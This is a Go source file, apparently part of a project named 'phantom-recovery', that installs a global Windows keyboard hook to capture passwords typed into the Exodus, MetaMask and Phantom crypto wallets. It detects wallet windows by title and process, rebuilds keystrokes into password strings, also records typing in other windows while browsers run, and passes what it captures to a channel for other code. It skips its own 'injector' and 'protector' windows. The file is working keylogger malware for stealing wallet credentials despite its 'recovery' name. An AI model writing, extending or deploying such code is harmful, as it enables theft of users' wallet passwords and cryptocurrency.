//go:build windows

package hook

import (
	"runtime"
	"strings"
	"sync"
	"syscall"
	"unicode/utf8"
	"unsafe"

	"phantom-recovery/internal/types"
)

// --- Windows API ---

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procSetWindowsHookExW        = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx      = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx           = user32.NewProc("CallNextHookEx")
	procGetMessageW              = user32.NewProc("GetMessageW")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32.NewProc("Process32NextW")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
)

// --- Constants ---

const (
	whKeyboardLL    = 13
	wmKeyDown       = 0x0100
	wmSysKeyDown    = 0x0104
	vkReturn        = 0x0D
	vkBack          = 0x08
	vkTab           = 0x09
	vkEscape        = 0x1B
	vkSpace         = 0x20
	vkDelete        = 0x2E
	vkShift         = 0x10
	vkControl       = 0x11
	vkMenu          = 0x12 // Alt
	vkCapital       = 0x14
	vkLShift        = 0xA0
	vkRShift        = 0xA1
	vkLControl      = 0xA2
	vkRControl      = 0xA3
	vkLMenu         = 0xA4
	vkRMenu         = 0xA5
	vkLWin          = 0x5B
	vkRWin          = 0x5C
	th32csSnapProc  = 0x00000002
	maxPath         = 260
)

// --- Types ---

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type msg struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type processEntry32W struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [maxPath]uint16
}

// LogFunc is an optional log callback. Set it before calling Start().
var LogFunc func(tag, format string, args ...interface{})

func log(tag, format string, args ...interface{}) {
	if LogFunc != nil {
		LogFunc(tag, format, args...)
	}
}

// --- Foreground detection result ---

const (
	fgNone     = ""
	fgExodus   = "exodus"
	fgMetaMask = "metamask"
	fgPhantom  = "phantom"
)

// --- Hook state ---

var (
	hookHandle uintptr
	mu         sync.Mutex

	exodusBuffer   []rune
	metamaskBuffer []rune
	phantomBuffer  []rune
	globalBuffer   []rune

	eventChan chan types.PasswordEvent

	lastFgApp string
	lastTitle string
)

// Start installs the keyboard hook and returns a channel that receives
// password candidates with their source. The hook runs until Stop is called.
func Start() <-chan types.PasswordEvent {
	ch := make(chan types.PasswordEvent, 64)
	eventChan = ch
	exodusBuffer = make([]rune, 0, 256)
	metamaskBuffer = make([]rune, 0, 256)
	phantomBuffer = make([]rune, 0, 256)
	globalBuffer = make([]rune, 0, 256)

	go runLoop()
	return ch
}

// Stop removes the keyboard hook.
func Stop() {
	if hookHandle != 0 {
		procUnhookWindowsHookEx.Call(hookHandle)
		hookHandle = 0
	}
}

func runLoop() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer func() {
		recover()
		if eventChan != nil {
			close(eventChan)
		}
	}()

	cb := syscall.NewCallback(hookProc)
	h, _, _ := procSetWindowsHookExW.Call(whKeyboardLL, cb, 0, 0)
	if h == 0 {
		log("HOOK", "SetWindowsHookExW failed")
		return
	}
	hookHandle = h
	log("HOOK", "Keyboard hook installed")

	var m msg
	for {
		ret, _, _ := procGetMessageW.Call(
			uintptr(unsafe.Pointer(&m)), 0, 0, 0,
		)
		if ret == 0 || int32(ret) == -1 {
			break
		}
	}
}

func hookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*kbdllHookStruct)(unsafe.Pointer(lParam))
		fgApp, title := detectForegroundApp()

		if fgApp != lastFgApp || (fgApp != fgNone && title != lastTitle) {
			lastFgApp = fgApp
			if title != "" {
				lastTitle = title
				if fgApp != fgNone {
					log("HOOK", "Target window [%s]: '%s'", fgApp, title)
				}
			}
		}

		switch fgApp {
		case fgExodus:
			processWalletKey(kb, &exodusBuffer, fgExodus)
		case fgMetaMask:
			processWalletKey(kb, &metamaskBuffer, fgMetaMask)
		case fgPhantom:
			processWalletKey(kb, &phantomBuffer, fgPhantom)
		default:
			mu.Lock()
			if len(exodusBuffer) > 0 {
				exodusBuffer = exodusBuffer[:0]
			}
			if len(metamaskBuffer) > 0 {
				metamaskBuffer = metamaskBuffer[:0]
			}
			if len(phantomBuffer) > 0 {
				phantomBuffer = phantomBuffer[:0]
			}
			mu.Unlock()
		}

		processGlobalKey(kb, fgApp)
	}

	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

// ---------------------------------------------------------------------------
// Foreground app detection
// ---------------------------------------------------------------------------

func detectForegroundApp() (string, string) {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return fgNone, ""
	}

	var titleBuf [256]uint16
	ret, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&titleBuf[0])), 256)
	title := ""
	if ret > 0 {
		title = syscall.UTF16ToString(titleBuf[:])
	}

	lower := strings.ToLower(title)

	// Exclude our own windows and system dialogs
	for _, excl := range []string{
		"exodus-v2", "exodus_v2", "exodusinjector", "exodus-injector",
		"exodus-v3", "exodus_v3",
		"file explorer", "exodus-protector",
	} {
		if strings.Contains(lower, excl) {
			return fgNone, title
		}
	}

	// Check for MetaMask popup (browser window with MetaMask in title)
	if strings.Contains(lower, "metamask") ||
		strings.Contains(lower, "unlock wallet") ||
		strings.Contains(lower, "confirm") && isBrowserProcess(hwnd) {
		if isBrowserProcess(hwnd) {
			return fgMetaMask, title
		}
	}

	// Check for Phantom popup
	if strings.Contains(lower, "phantom") && isBrowserProcess(hwnd) {
		return fgPhantom, title
	}

	// Check for Exodus (title contains "exodus" or PID match)
	if strings.Contains(lower, "exodus") {
		return fgExodus, title
	}

	// PID-based Exodus detection
	var windowPID uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&windowPID)))
	if windowPID != 0 {
		for _, pid := range getProcessPIDs("exodus.exe") {
			if windowPID == pid {
				return fgExodus, title
			}
		}
	}

	return fgNone, title
}

// isBrowserProcess checks if the foreground window belongs to a browser process.
func isBrowserProcess(hwnd uintptr) bool {
	var windowPID uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&windowPID)))
	if windowPID == 0 {
		return false
	}

	// All Chromium browser process names, including Edge variants
	browserNames := []string{
		"chrome.exe",
		"msedge.exe",
		"brave.exe",
		"opera.exe",
		"vivaldi.exe",
		"firefox.exe",
	}
	for _, name := range browserNames {
		for _, pid := range getProcessPIDs(name) {
			if windowPID == pid {
				return true
			}
		}
	}
	return false
}

// IsExodusRunning returns true if any exodus.exe process exists.
func IsExodusRunning() bool {
	return len(getProcessPIDs("exodus.exe")) > 0
}

// IsAnyTargetRunning returns true if any target wallet process is running.
func IsAnyTargetRunning() bool {
	targets := []string{"exodus.exe", "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"}
	for _, t := range targets {
		if len(getProcessPIDs(t)) > 0 {
			return true
		}
	}
	return false
}

func getProcessPIDs(processName string) []uint32 {
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapProc, 0)
	if snapshot == ^uintptr(0) {
		return nil
	}
	defer procCloseHandle.Call(snapshot)

	var entry processEntry32W
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil
	}

	target := strings.ToLower(processName)
	var pids []uint32
	for {
		name := strings.ToLower(syscall.UTF16ToString(entry.SzExeFile[:]))
		if name == target {
			pids = append(pids, entry.Th32ProcessID)
		}
		entry.DwSize = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32NextW.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return pids
}

// ---------------------------------------------------------------------------
// Wallet-specific key processing
// ---------------------------------------------------------------------------

func processWalletKey(kb *kbdllHookStruct, buffer *[]rune, source string) {
	vk := kb.VkCode

	// Ctrl+A clears buffer
	if vk == 0x41 {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(vkControl))
		if state&0x8000 != 0 {
			mu.Lock()
			*buffer = (*buffer)[:0]
			mu.Unlock()
			return
		}
	}

	switch vk {
	case vkReturn:
		submitBuffer(buffer, source)
		return
	case vkBack:
		mu.Lock()
		if len(*buffer) > 0 {
			*buffer = (*buffer)[:len(*buffer)-1]
		}
		mu.Unlock()
		return
	case vkDelete, vkEscape:
		mu.Lock()
		*buffer = (*buffer)[:0]
		mu.Unlock()
		return
	case vkTab:
		submitBuffer(buffer, source)
		return
	case vkSpace:
		mu.Lock()
		currentBuf := string(*buffer)
		*buffer = append(*buffer, ' ')
		mu.Unlock()
		if currentBuf != "" {
			trySend(currentBuf, source)
		}
		return
	case vkShift, vkControl, vkMenu, vkCapital,
		vkLShift, vkRShift, vkLControl, vkRControl,
		vkLMenu, vkRMenu, vkLWin, vkRWin:
		return
	}

	// Skip non-character keys
	if vk >= 0x70 && vk <= 0x87 {
		return
	}
	if vk >= 0x25 && vk <= 0x28 {
		return
	}
	if vk >= 0x21 && vk <= 0x24 {
		return
	}
	if vk == 0x2C || vk == 0x2D {
		return
	}
	if vk == 0x90 || vk == 0x91 {
		return
	}

	ch := translateKey(kb)
	if ch != 0 && ch != '\r' && ch != '\n' && utf8.ValidRune(ch) && ch >= 0x20 {
		mu.Lock()
		*buffer = append(*buffer, ch)
		mu.Unlock()
	}
}

func submitBuffer(buffer *[]rune, source string) {
	mu.Lock()
	password := string(*buffer)
	*buffer = (*buffer)[:0]
	mu.Unlock()

	if password != "" {
		log("HOOK", "Password captured [%s, %d chars]", source, len(password))
		trySend(password, source)
	}
}

// ---------------------------------------------------------------------------
// Global key processing (backup capture for non-wallet windows)
// ---------------------------------------------------------------------------

func processGlobalKey(kb *kbdllHookStruct, currentApp string) {
	vk := kb.VkCode

	switch vk {
	case vkReturn:
		if currentApp != fgNone {
			mu.Lock()
			globalBuffer = globalBuffer[:0]
			mu.Unlock()
			return
		}
		mu.Lock()
		password := string(globalBuffer)
		globalBuffer = globalBuffer[:0]
		mu.Unlock()
		if len(password) >= 1 && len(password) <= 200 && IsAnyTargetRunning() {
			trySend(password, "global")
		}
		return
	case vkBack:
		mu.Lock()
		if len(globalBuffer) > 0 {
			globalBuffer = globalBuffer[:len(globalBuffer)-1]
		}
		mu.Unlock()
		return
	case vkShift, vkControl, vkMenu, vkCapital, vkTab, vkEscape,
		vkLShift, vkRShift, vkLControl, vkRControl, vkLMenu, vkRMenu,
		vkLWin, vkRWin:
		return
	}

	if vk >= 0x70 && vk <= 0x87 {
		return
	}
	if vk >= 0x25 && vk <= 0x28 {
		return
	}
	if vk >= 0x21 && vk <= 0x24 {
		return
	}
	if vk == 0x2C || vk == 0x2D || vk == vkDelete {
		return
	}
	if vk == 0x90 || vk == 0x91 {
		return
	}

	ch := translateKey(kb)
	if ch != 0 && ch != '\r' && ch != '\n' && utf8.ValidRune(ch) && ch >= 0x20 {
		mu.Lock()
		globalBuffer = append(globalBuffer, ch)
		if len(globalBuffer) > 200 {
			globalBuffer = globalBuffer[len(globalBuffer)-100:]
		}
		mu.Unlock()
	}
}

// ---------------------------------------------------------------------------
// Key translation
// ---------------------------------------------------------------------------

func translateKey(kb *kbdllHookStruct) rune {
	var keyState [256]byte
	for i := 0; i < 256; i++ {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(i))
		if state&0x8000 != 0 {
			keyState[i] = 0x80
		}
		if i == vkCapital {
			state2, _, _ := procGetAsyncKeyState.Call(uintptr(vkCapital))
			if state2&0x0001 != 0 {
				keyState[i] |= 0x01
			}
		}
	}

	hwnd, _, _ := procGetForegroundWindow.Call()
	tid, _, _ := procGetWindowThreadProcessId.Call(hwnd, 0)
	hkl, _, _ := procGetKeyboardLayout.Call(tid)

	var buf [4]uint16
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(kb.VkCode),
		uintptr(kb.ScanCode),
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		4, 0, hkl,
	)

	if int32(ret) > 0 {
		return rune(buf[0])
	}
	return 0
}

// ---------------------------------------------------------------------------
// Event sending
// ---------------------------------------------------------------------------

func trySend(password, source string) {
	if eventChan == nil {
		return
	}
	evt := types.PasswordEvent{Password: password, Source: source}
	select {
	case eventChan <- evt:
	default:
		select {
		case <-eventChan:
		default:
		}
		select {
		case eventChan <- evt:
		default:
		}
	}
}
